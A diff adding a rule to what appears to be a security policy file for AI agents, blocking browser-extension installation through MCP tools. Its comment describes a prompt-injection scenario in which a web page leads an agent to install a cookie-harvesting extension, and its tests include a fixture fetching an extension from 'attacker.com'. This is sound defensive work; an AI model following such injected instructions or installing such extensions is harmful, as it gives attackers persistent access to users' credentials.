@@ -1241,3 +1241,63 @@ structural_rules:
           args: {"path": "/home/user/.config/git/hooks/pre-commit"}
         - tool: "write_file"
           args: {"path": "/workspace/myapp/.git/hooks/post-merge"}
+
+rules:
+  # === BLOCK: Browser extension installation via MCP tools (issue #769) ===
+  #
+  # Browser extensions execute code in the browser process on every session,
+  # making this a persistent code execution vector (MITRE T1176). A browser
+  # extension installed by a prompt-injected agent persists indefinitely —
+  # it survives agent session termination, process restarts, and user logout/login.
+  #
+  # Attack scenario:
+  #   1. Attacker embeds "install extension X" in a web page the agent visits
+  #   2. Agent calls install_extension with a malicious CRX/XPI URL
+  #   3. Extension runs in every browser session, harvesting cookies and credentials
+  #   4. No shell command or file write required — pure MCP tool call
+  #
+  # Legitimate developer workflows (writing manifest.json, running extension tests)
+  # do not require an autonomous agent to call installation tools. Developers
+  # install extensions manually through the browser UI.
+  #
+  # MITRE T1176 — Browser Extensions
+  # OWASP LLM06 2025 — Excessive Agency
+  - id: mcp-persist-block-browser-extension-install
+    taxonomy: "persistence-evasion/persistence/browser-extension-install"
+    match:
+      tool_name_any:
+        - "install_extension"
+        - "browser_install_extension"
+        - "add_browser_extension"
+        - "add_extension"
+        - "extension_install"
+        - "playwright_install_extension"
+        - "puppeteer_install_extension"
+        - "chrome_install_extension"
+        - "firefox_install_extension"
+        - "safari_install_extension"
+        - "browser_add_extension"
+        - "load_extension"
+        - "browser_load_extension"
+    decision: "BLOCK"
+    confidence: 0.95
+    reason: "Browser extension installation via MCP tool — extensions execute code in every browser session, creating persistent access that survives agent termination. No legitimate developer workflow requires autonomous extension installation. MITRE T1176, OWASP LLM06."
+    tests:
+      tp:
+        - tool: "install_extension"
+          args: {"id": "evil-ext-123"}
+        - tool: "browser_install_extension"
+          args: {"id": "malicious-extension", "browser": "chrome"}
+        - tool: "playwright_install_extension"
+          args: {"path": "/tmp/malicious.crx"}
+        - tool: "add_extension"
+          args: {"url": "https://attacker.com/ext.crx"}
+        - tool: "load_extension"
+          args: {"path": "/home/user/Downloads/suspicious.xpi"}
+      tn:
+        - tool: "read_file"
+          args: {"path": "/workspace/browser-extension/manifest.json"}
+        - tool: "list_extensions"
+          args: {}
+        - tool: "write_file"
+          args: {"path": "/workspace/my-extension/popup.js"}
